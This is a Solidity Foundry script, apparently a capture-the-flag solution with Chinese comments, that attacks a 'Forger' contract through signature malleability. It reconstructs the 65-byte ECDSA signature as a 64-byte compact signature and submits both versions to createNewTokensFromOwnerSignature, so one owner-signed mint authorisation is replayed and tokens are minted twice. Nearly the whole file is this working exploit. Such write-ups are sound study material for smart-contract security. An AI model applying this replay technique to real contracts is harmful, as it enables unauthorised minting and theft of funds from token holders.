// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IForger {
    function createNewTokensFromOwnerSignature(
        bytes calldata signature,
        address receiver,
        uint256 amount,
        bytes32 salt,         
        uint256 deadline    
    ) external;
    function totalSupply() external view returns (uint256);
}

contract SolveForger is Script {
    function run() external {
        address targetAddr = vm.envAddress("INSTANCE_ADDRESS");
        IForger target = IForger(targetAddr);

        // --- 1. 準備題目給的原始數據 ---
        bytes memory sig65 = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

        // --- 2. 構造 64 字節的 Compact 簽名 ---
        // 原始：r = sig[0:32], s = sig[32:64], v = sig[64]
        // Compact: r = sig[0:32], vs = s | ((v-27) << 255)
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sig65, 32))
            s := mload(add(sig65, 64))
            v := byte(0, mload(add(sig65, 96)))
        }
      
        // 如果 v 是 27, yParity 是 0; 如果 v 是 28, yParity 是 1
        uint256 yParity = v - 27;
        bytes32 vs = s | bytes32(yParity << 255);
        bytes memory sig64 = abi.encodePacked(r, vs);

        console.log("Original Sig (65 bytes) hash:", vm.toString(keccak256(sig65)));
        console.log("Compact  Sig (64 bytes) hash:", vm.toString(keccak256(sig64)));

        // --- 3. 開始執行 ---
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Submitting original signature...");
        target.createNewTokensFromOwnerSignature(sig65, receiver, amount, salt, deadline);

        console.log("Submitting compact signature...");
        target.createNewTokensFromOwnerSignature(sig64, receiver, amount, salt, deadline);

        console.log("Total Supply:", target.totalSupply());
        vm.stopBroadcast();
    }
}